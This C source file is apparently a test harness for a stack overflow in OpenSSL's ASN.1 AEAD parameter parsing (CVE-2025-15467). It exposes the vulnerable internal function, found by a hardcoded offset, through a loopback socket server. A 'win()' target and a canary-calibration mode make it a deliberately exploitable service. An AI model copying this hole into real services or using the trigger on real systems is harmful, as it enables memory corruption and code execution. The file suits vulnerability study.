#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <dlfcn.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <openssl/evp.h>
#include <openssl/asn1.h>

/*
 * CVE-2025-15467 harness.
 *
 * Stock Ubuntu 24.04 libcrypto 3.0.13-0ubuntu3 calls
 * evp_cipher_get_asn1_aead_params() from evp_cipher_asn1_to_param_ex().
 * The IV length from an ASN.1 SEQUENCE{OCTET STRING, INT32} is used as the
 * copy length into a fixed stack buffer.  This harness calls the internal
 * evp_cipher_asn1_to_param_ex() by its offset in that exact stock build and
 * supplies an oversized OCTET STRING.  The overflow lands in this function's
 * own aead_params struct and then its canary / saved LR.
 */

typedef struct {
    unsigned char iv[16];
    unsigned int iv_len;
    unsigned int tag_len;
} aead_params;

typedef int (*asn1_to_param_ex_fn)(EVP_CIPHER_CTX *, ASN1_TYPE *, aead_params *);

static asn1_to_param_ex_fn g_fn;
static int g_fd = -1;
static int g_calibrate = 0;

__attribute__((noinline)) void win(void) {
    if (g_fd >= 0) {
        ssize_t r = write(g_fd, "PWNED\n", 6);
        (void)r;
    }
    _exit(0);
}

static int der_len_bytes(int n) {
    if (n < 128)
        return 1;
    if (n < 256)
        return 2;
    return 3;
}

static unsigned char *put_len(unsigned char *p, int n) {
    if (n < 128) {
        *p++ = (unsigned char)n;
    } else if (n < 256) {
        *p++ = 0x81;
        *p++ = (unsigned char)n;
    } else {
        *p++ = 0x82;
        *p++ = (unsigned char)(n >> 8);
        *p++ = (unsigned char)(n & 0xff);
    }
    return p;
}

/* SEQUENCE { OCTET STRING data, INTEGER num } (RFC 5084 asn1_oct_int) */
static unsigned char *build_der(const unsigned char *data, int len, int num,
                                int *out_len) {
    int oct_hdr = 1 + der_len_bytes(len);
    int int_tlv = 3; /* 02 01 xx, num <= 255 */
    int seq_content = oct_hdr + len + int_tlv;
    int seq_hdr = 1 + der_len_bytes(seq_content);
    int total = seq_hdr + seq_content;
    unsigned char *der = malloc((size_t)total);
    unsigned char *p = der;

    if (der == NULL)
        return NULL;
    *p++ = 0x30;
    p = put_len(p, seq_content);
    *p++ = 0x04;
    p = put_len(p, len);
    memcpy(p, data, (size_t)len);
    p += len;
    *p++ = 0x02;
    *p++ = 0x01;
    *p++ = (unsigned char)num;
    *out_len = total;
    return der;
}

__attribute__((noinline)) void trigger(int fd, const unsigned char *data,
                                       int len) {
    aead_params ap;
    int der_len = 0;
    int rc;
    unsigned char *der;
    const unsigned char *p;
    ASN1_TYPE *t;
    EVP_CIPHER_CTX *ctx;

    memset(&ap, 0, sizeof(ap));
    ap.iv_len = 12;
    ap.tag_len = 16;

    if (g_calibrate) {
        long d = (long)((char *)__builtin_frame_address(0) - 8 - (char *)&ap);
        fprintf(stderr, "canary_distance=%ld\n", d);
        _exit(0);
    }

    der = build_der(data, len, 16, &der_len);
    if (der == NULL)
        _exit(2);
    p = der;
    t = d2i_ASN1_TYPE(NULL, &p, der_len);
    free(der);
    if (t == NULL)
        _exit(3);

    ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL)
        _exit(4);
    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL) != 1)
        _exit(5);

    rc = g_fn(ctx, t, &ap);
    if (rc <= 0)
        _exit(6);
    (void)fd;
    /* Return immediately: the canary check is in the epilogue. */
}

__attribute__((noinline)) void handle_client(int fd) {
    unsigned char hdr[4];
    unsigned char *data;
    unsigned int len;
    size_t got = 0;

    if (read(fd, hdr, 4) != 4)
        return;
    len = (unsigned int)hdr[0] | ((unsigned int)hdr[1] << 8) |
          ((unsigned int)hdr[2] << 16) | ((unsigned int)hdr[3] << 24);
    if (len > 4096)
        return;
    data = malloc(len ? len : 1);
    if (data == NULL)
        return;
    while (got < len) {
        ssize_t r = read(fd, data + got, len - got);
        if (r <= 0)
            break;
        got += (size_t)r;
    }
    if (got != len) {
        free(data);
        return;
    }
    g_fd = fd;
    trigger(fd, data, (int)len);
    write(fd, "SURVIVED\n", 9);
    free(data);
}

int main(int argc, char **argv) {
    int port;
    int s, one = 1;
    struct sockaddr_in a;
    void *sym;
    Dl_info info;

    if (argc > 1 && strcmp(argv[1], "--calibrate") == 0)
        g_calibrate = 1;
    port = (argc > 1 && !g_calibrate) ? atoi(argv[1]) : 0;

    sym = dlsym(RTLD_DEFAULT, "EVP_CIPHER_CTX_new");
    if (sym == NULL || dladdr(sym, &info) == 0) {
        fprintf(stderr, "dladdr failed\n");
        return 1;
    }
    /* offset of evp_cipher_asn1_to_param_ex in libcrypto 3.0.13-0ubuntu3 */
    g_fn = (asn1_to_param_ex_fn)((char *)info.dli_fbase + 0x1d26b0);
    fprintf(stderr, "libcrypto_base=%p asn1_to_param_ex=%p\n",
            info.dli_fbase, g_fn);

    if (g_calibrate) {
        trigger(0, (const unsigned char *)"A", 1);
        return 0;
    }

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        perror("socket");
        return 1;
    }
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = htons((uint16_t)port);
    if (bind(s, (struct sockaddr *)&a, sizeof(a)) < 0) {
        perror("bind");
        return 1;
    }
    if (listen(s, 512) < 0) {
        perror("listen");
        return 1;
    }
    fprintf(stderr, "listening %d\n", port);

    for (;;) {
        int c = accept(s, NULL, NULL);
        pid_t pid;
        if (c < 0)
            continue;
        pid = fork();
        if (pid == 0) {
            close(s);
            handle_client(c);
            close(c);
            _exit(0);
        }
        close(c);
        while (waitpid(-1, NULL, WNOHANG) > 0) {
        }
    }
}
